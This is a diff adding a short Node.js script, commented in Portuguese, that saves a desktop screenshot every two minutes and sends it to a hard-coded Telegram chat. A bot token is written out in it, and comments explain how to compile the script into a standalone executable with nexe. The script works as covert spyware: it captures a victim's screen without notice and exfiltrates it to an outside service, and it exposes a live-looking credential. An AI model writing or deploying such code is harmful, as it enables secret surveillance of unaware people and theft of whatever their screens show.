@@ -1,0 +1,45 @@
+//https://api.telegram.org/bot863878594:AAE95kZdNGyn1CVzdETsj0Gt0dl37JdMCfI/getUpdates
+//npm install -g nexe
+//nexe -i hello.js -o hello
+
+const fs = require('fs');
+const dir = "C:\\rodrigo\\img";
+
+//Verifica se não existe
+if (!fs.existsSync(dir)){
+    //Efetua a criação do diretório
+    fs.mkdirSync(dir);
+}
+
+
+
+
+var temporal = require('temporal');
+var screenshot = require('desktop-screenshot');
+const Telegram = require('telegraf/telegram');
+
+const CHAT_ID = '-488004429';
+const token = '863878594:AAE95kZdNGyn1CVzdETsj0Gt0dl37JdMCfI';
+const telegram = new Telegram(token);
+ enviar();
+
+function enviar(){
+  temporal.loop(120000,function(){
+  temporal.delay(10000,function(){print()})
+  
+
+  }
+);
+}
+function print(){
+
+  screenshot("C:\\rodrigo\\img\\screenshot.png", function(error, complete) {
+     // if(error)
+        //console.log("Screenshot failed", error);
+     // else
+        //console.log("Screenshot succeeded");
+        telegram.sendDocument(CHAT_ID,{source:'C:\\rodrigo\\img\\screenshot.png'});
+  });
+  
+
+}
